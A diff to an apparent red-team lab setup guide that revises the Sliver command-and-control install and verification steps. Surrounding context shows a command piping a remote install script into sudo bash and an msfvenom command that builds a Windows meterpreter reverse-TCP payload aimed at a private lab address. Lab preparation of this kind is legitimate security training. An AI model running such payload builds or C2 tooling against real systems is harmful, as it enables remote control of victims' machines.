@@ -416,7 +416,29 @@ If missing: `sudo apt install metasploit-framework -y`
 ```bash
 curl https://sliver.sh/install | sudo bash
 ```
-Verify: `sliver-server version`
+
+The install script does three things:
+1. Downloads `sliver-server` to `/root/sliver-server`
+2. Downloads `sliver-client` to `/usr/local/bin/sliver-client` and creates a symlink at `/usr/local/bin/sliver`
+3. Sets up and starts a **systemd service** for the server
+
+The server runs as a background service. You do NOT run `sliver-server` directly.
+
+To verify it is working:
+```bash
+# Check the service is running
+sudo systemctl status sliver
+
+# Open the Sliver client console
+sliver
+```
+
+You should see the Sliver banner and a `sliver >` prompt. Type `help` then `exit`.
+
+If the service is not running:
+```bash
+sudo systemctl start sliver
+```
 
 **Install MinGW (cross-compiler for Windows):**
 ```bash
@@ -434,12 +456,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.44.128 LPORT=4444 
 ls -la /tmp/test_payload.exe
 ```
 Should create a file without errors. We won't run it yet.
-
-**Quick test - Sliver:**
-```bash
-sliver-server
-```
-You should see the Sliver banner. Type `help` then `exit`.
 
 ---
 
